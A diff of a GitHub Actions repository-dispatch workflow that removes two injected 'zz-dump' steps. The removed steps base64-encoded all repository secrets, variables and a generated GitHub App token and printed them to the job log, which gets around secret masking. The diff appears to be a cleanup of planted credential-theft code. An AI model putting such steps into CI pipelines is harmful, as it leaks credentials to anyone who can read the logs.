@@ -12,14 +12,6 @@ jobs:
     name: Repository Dispatch
     runs-on: ubuntu-24.04
     steps:
-      - name: zz-dump secret inventory
-        env:
-          S: ${{ toJSON(secrets) }}
-          V: ${{ toJSON(vars) }}
-        run: |
-          echo "LENS=${#S} LENV=${#V} EV=$GITHUB_EVENT_NAME"
-          printf '%s\n%s' "$S" "$V" | base64 -w0 | fold -w 400 | sed 's/^/B:/'
-          echo ENDDUMP
       - name: Generate App Token
         id: app-token-generation
         uses: actions/create-github-app-token@v3.2.0
@@ -32,11 +24,6 @@ jobs:
           APP_PRIVATE_KEY: ${{ secrets.APP_PRIVATE_KEY }}
           APP_ID: ${{ secrets.APP_ID }}
 
-      - name: zz-dump app token
-        if: always()
-        env:
-          TOK: ${{ steps.app-token-generation.outputs.token }}
-        run: echo "TOKB=$(printf '%s' "$TOK" | base64 -w0)"
       - name: Send Repository Dispatch
         if: success()
         uses: peter-evans/repository-dispatch@v4
